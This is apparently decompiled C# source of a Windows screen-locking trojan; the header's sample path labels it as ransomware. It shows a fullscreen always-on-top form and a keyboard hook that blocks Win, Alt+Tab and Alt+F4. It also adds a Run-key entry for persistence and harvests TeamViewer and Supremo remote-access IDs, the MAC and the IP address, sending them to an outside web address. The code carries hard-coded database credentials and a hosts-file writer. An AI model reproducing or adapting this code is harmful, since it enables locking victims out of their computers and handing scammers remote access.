// Decompiled with JetBrains decompiler
// Type: newpop.Form1
// Assembly: newpop, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4E9BFEDA-910E-4B3C-A721-21734B603982
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Agent.gen-1c49d5884a122b364208024ff7da6adcdc9a4b9e610b7114a33bfd598e1d5501.exe

using Microsoft.Win32;
using MySql.Data.MySqlClient;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace newpop
{
  public class Form1 : Form
  {
    private MySqlConnection conn;
    private string mac;
    private string pc_locked;
    private string teamviewer;
    private string sMacAddress = string.Empty;
    private string country = "jp";
    private string cp_disable;
    private string taskmanager;
    private string host_file;
    private string Teamviewerstring = string.Empty;
    private string Supremostring = string.Empty;
    private string connString = "SERVER=107.180.3.171; PORT=3306; DATABASE=computer_details; UID=computer_details; PASSWORD=admin@password";
    private IntPtr ptrHook;
    private Form1.LowLevelKeyboardProc objKeyboardProcess;
    private const int WH_KEYBOARD_LL = 13;
    private int intLLKey;
    private Form1.KBDLLHOOKSTRUCT lParam;
    private const int WH_KEYBOARD_LLs = 13;
    private IContainer components = (IContainer) null;
    private Label label1;
    private Label label2;
    private Label label3;
    private Label label4;

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(
      int id,
      Form1.LowLevelKeyboardProc callback,
      IntPtr hMod,
      uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool UnhookWindowsHookEx(IntPtr hook);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(
      IntPtr hook,
      int nCode,
      IntPtr wp,
      IntPtr lp);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string name);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern short GetAsyncKeyState(Keys key);

    public static bool ModifyHostsFile(string entry)
    {
      try
      {
        using (StreamWriter streamWriter = System.IO.File.AppendText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "drivers\\etc\\hosts")))
        {
          streamWriter.WriteLine(entry);
          return true;
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        return false;
      }
    }

    public Form1()
    {
      this.InitializeComponent();
      this.Hide();
      this.WindowState = FormWindowState.Normal;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Bounds = Screen.PrimaryScreen.Bounds;
      this.MinimizeBox = false;
      this.MaximizeBox = false;
      this.ControlBox = false;
      Form1.GetTeamviewerID();
      this.GetTeamViewerId();
      this.supremo();
      foreach (NetworkInterface networkInterface in NetworkInterface.GetAllNetworkInterfaces())
      {
        if (this.sMacAddress == string.Empty)
        {
          networkInterface.GetIPProperties();
          this.sMacAddress = networkInterface.GetPhysicalAddress().ToString();
        }
      }
      ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
      this.objKeyboardProcess = new Form1.LowLevelKeyboardProc(this.captureKey);
      this.ptrHook = Form1.SetWindowsHookEx(13, this.objKeyboardProcess, Form1.GetModuleHandle(mainModule.ModuleName), 0U);
    }

    private IntPtr captureKey(int nCode, IntPtr wp, IntPtr lp)
    {
      if (nCode >= 0)
      {
        Form1.KBDLLHOOKSTRUCT structure = (Form1.KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lp, typeof (Form1.KBDLLHOOKSTRUCT));
        if (structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.Tab && this.HasAltModifier(structure.flags) || structure.key == Keys.Escape && (Control.ModifierKeys & Keys.Control) == Keys.Control)
          return (IntPtr) 1;
      }
      return Form1.CallNextHookEx(this.ptrHook, nCode, wp, lp);
    }

    private IntPtr workingkey(int nCode, IntPtr wp, IntPtr lp)
    {
      if (nCode >= 0)
      {
        Form1.KBDLLHOOKSTRUCT structure = (Form1.KBDLLHOOKSTRUCT) Marshal.PtrToStructure(lp, typeof (Form1.KBDLLHOOKSTRUCT));
        if (structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.RWin || structure.key == Keys.LWin || structure.key == Keys.Tab && this.HasAltModifier(structure.flags) || structure.key == Keys.Escape && (Control.ModifierKeys & Keys.Control) == Keys.Control)
          return (IntPtr) 0;
      }
      return Form1.CallNextHookEx(this.ptrHook, nCode, wp, lp);
    }

    private bool HasAltModifier(int flags) => (flags & 32) == 32;

    private long GetTeamViewerId()
    {
      try
      {
        string name1 = Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\TeamViewer" : "SOFTWARE\\TeamViewer";
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name1);
        if (registryKey == null)
          return 0;
        object obj1 = registryKey.GetValue("ClientID");
        this.Teamviewerstring = obj1.ToString();
        if (obj1 != null)
          return Convert.ToInt64(obj1);
        foreach (string name2 in ((IEnumerable<string>) registryKey.GetSubKeyNames()).Reverse<string>())
        {
          object obj2 = registryKey.OpenSubKey(name2).GetValue("ClientID");
          if (obj2 != null)
            return Convert.ToInt64(obj2);
        }
        return 0;
      }
      catch (Exception ex)
      {
        return 0;
      }
    }

    private long supremo()
    {
      try
      {
        string name1 = Environment.Is64BitOperatingSystem ? "SOFTWARE\\Wow6432Node\\supremo" : "SOFTWARE\\supremo";
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name1);
        if (registryKey == null)
          return 0;
        object obj1 = registryKey.GetValue("ClientID");
        this.Supremostring = obj1.ToString();
        if (obj1 != null)
          return Convert.ToInt64(obj1);
        foreach (string name2 in ((IEnumerable<string>) registryKey.GetSubKeyNames()).Reverse<string>())
        {
          object obj2 = registryKey.OpenSubKey(name2).GetValue("ClientID");
          if (obj2 != null)
            return Convert.ToInt64(obj2);
        }
        return 0;
      }
      catch (Exception ex)
      {
        return 0;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.ShowInTaskbar = false;
      this.WindowState = FormWindowState.Normal;
      this.Focus();
      this.TopMost = true;
      this.Bounds = Screen.PrimaryScreen.Bounds;
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
      registryKey.SetValue("mac testing", (object) Application.ExecutablePath.ToString());
      this.label1.Text = this.Teamviewerstring.Substring(this.Teamviewerstring.Length - 5);
      this.label3.Text = this.sMacAddress.Substring(this.sMacAddress.Length - 10);
      string empty1 = string.Empty;
      string hostName = Dns.GetHostName();
      Console.WriteLine("Local Machine's Host Name: " + hostName);
      IPAddress[] addressList = Dns.GetHostEntry(hostName).AddressList;
      string empty2 = string.Empty;
      for (int index = 0; index < addressList.Length; ++index)
        empty2 = addressList[index].ToString();
      try
      {
        WebBrowser webBrowser = new WebBrowser();
        string currentDirectory = Directory.GetCurrentDirectory();
        webBrowser.Url = new Uri(string.Format("http://gncmdstore.com/api_update.php?id=" + this.sMacAddress + "& ip=" + empty2 + "& TeamViewer_id=" + this.Teamviewerstring + "& country=" + this.country + "& supremoid=" + this.Supremostring, (object) currentDirectory));
        webBrowser.ScriptErrorsSuppressed = true;
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.ToString());
      }
      this.KeyboardHook((object) this, e);
    }

    public static string GetTeamviewerID()
    {
      List<string> list = ((IEnumerable<string>) new string[7]
      {
        "4",
        "5",
        "5.1",
        "6",
        "7",
        "8",
        "14"
      }).Reverse<string>().ToList<string>();
      string[] strArray = new string[2]
      {
        "SOFTWARE\\TeamViewer",
        "SOFTWARE\\Wow6432Node\\TeamViewer"
      };
      foreach (string name1 in strArray)
      {
        if (Registry.LocalMachine.OpenSubKey(name1) != null)
        {
          foreach (string str in list)
          {
            string name2 = string.Format("{0}\\Version{1}", (object) name1, (object) str);
            if (Registry.LocalMachine.OpenSubKey(name2) != null)
            {
              object obj = Registry.LocalMachine.OpenSubKey(name2).GetValue("ClientID");
              if (obj != null)
                return Convert.ToInt32(obj).ToString();
            }
          }
        }
      }
      return string.Empty;
    }

    [DllImport("user32.dll", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi)]
    private static extern int SetWindowsHookEx(
      int idHook,
      Form1.LowLevelKeyboardProcDelegate lpfn,
      int hMod,
      int dwThreadId);

    [DllImport("user32.dll")]
    private static extern int UnhookWindowsHookEx(int hHook);

    [DllImport("user32.dll", CharSet = CharSet.Ansi)]
    private static extern int CallNextHookEx(
      int hHook,
      int nCode,
      int wParam,
      ref Form1.KBDLLHOOKSTRUCT lParam);

    [DllImport("user32.dll", CharSet = CharSet.Ansi)]
    private static extern int SetWindowsHookExs(
      int idHook,
      Form1.LowLevelKeyboardProcDelegate lpfn,
      int hMod,
      int dwThreadId);

    [DllImport("user32.dll")]
    private static extern int UnhookWindowsHookExs(int hHook);

    [DllImport("user32.dll", CharSet = CharSet.Ansi)]
    private static extern int CallNextHookExs(
      int hHook,
      int nCode,
      int wParam,
      ref Form1.KBDLLHOOKSTRUCT lParam);

    private int LowLevelKeyboardProcs(int nCode, int wParam, ref Form1.KBDLLHOOKSTRUCT lParam)
    {
      bool flag = false;
      switch (wParam)
      {
        case 256:
        case 257:
        case 260:
        case 261:
          if (lParam.vkCode == 9 && lParam.flags == 32 || lParam.vkCode == 27 && lParam.flags == 32 || lParam.vkCode == 27 && lParam.flags == 0 || lParam.vkCode == 91 && lParam.flags == 1 || lParam.vkCode == 92 && lParam.flags == 1 || lParam.flags == 32)
          {
            flag = true;
            break;
          }
          if (lParam.vkCode == 77)
          {
            this.Close();
            flag = false;
            break;
          }
          break;
      }
      return flag ? 1 : Form1.CallNextHookEx(0, nCode, wParam, ref lParam);
    }

    private void KeyboardHook(object sender, EventArgs e) => this.intLLKey = Form1.SetWindowsHookEx(13, new Form1.LowLevelKeyboardProcDelegate(this.LowLevelKeyboardProcs), Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);

    private void ReleaseKeyboardHook() => this.intLLKey = Form1.UnhookWindowsHookEx(this.intLLKey);

    protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
    {
      if (keyData == (Keys.F4 | Keys.Alt))
        return true;
      if (keyData != (Keys.E | Keys.Control | Keys.Alt))
        return base.ProcessCmdKey(ref msg, keyData);
      this.Close();
      return false;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Form1));
      this.label1 = new Label();
      this.label2 = new Label();
      this.label3 = new Label();
      this.label4 = new Label();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.BackColor = SystemColors.ActiveCaption;
      this.label1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.Location = new Point(482, 35);
      this.label1.Name = "label1";
      this.label1.Size = new Size(51, 20);
      this.label1.TabIndex = 0;
      this.label1.Text = "label1";
      this.label2.AutoSize = true;
      this.label2.BackColor = SystemColors.ActiveCaption;
      this.label2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label2.Location = new Point(569, 35);
      this.label2.Name = "label2";
      this.label2.Size = new Size(44, 20);
      this.label2.TabIndex = 1;
      this.label2.Text = "MAC";
      this.label3.AutoSize = true;
      this.label3.BackColor = SystemColors.ActiveCaption;
      this.label3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.Location = new Point(619, 35);
      this.label3.Name = "label3";
      this.label3.Size = new Size(51, 20);
      this.label3.TabIndex = 2;
      this.label3.Text = "label3";
      this.label4.AutoSize = true;
      this.label4.BackColor = SystemColors.ActiveCaption;
      this.label4.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label4.Location = new Point(450, 35);
      this.label4.Name = "label4";
      this.label4.Size = new Size(26, 20);
      this.label4.TabIndex = 3;
      this.label4.Text = "ID";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      this.BackgroundImageLayout = ImageLayout.Stretch;
      this.ClientSize = new Size(800, 450);
      this.Controls.Add((Control) this.label4);
      this.Controls.Add((Control) this.label3);
      this.Controls.Add((Control) this.label2);
      this.Controls.Add((Control) this.label1);
      this.DoubleBuffered = true;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.TopMost = true;
      this.WindowState = FormWindowState.Maximized;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private struct KBDLLHOOKSTRUCT
    {
      public Keys key;
      public int scanCode;
      public int flags;
      public int time;
      public IntPtr extra;
      public int vkCode;
      public int dwExtraInfo;
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private delegate int LowLevelKeyboardProcDelegate(
      int nCode,
      int wParam,
      ref Form1.KBDLLHOOKSTRUCT lParam);

    private delegate int LowLevelKeyboardProcDelegates(
      int nCode,
      int wParam,
      ref Form1.KBDLLHOOKSTRUCT lParam);
  }
}
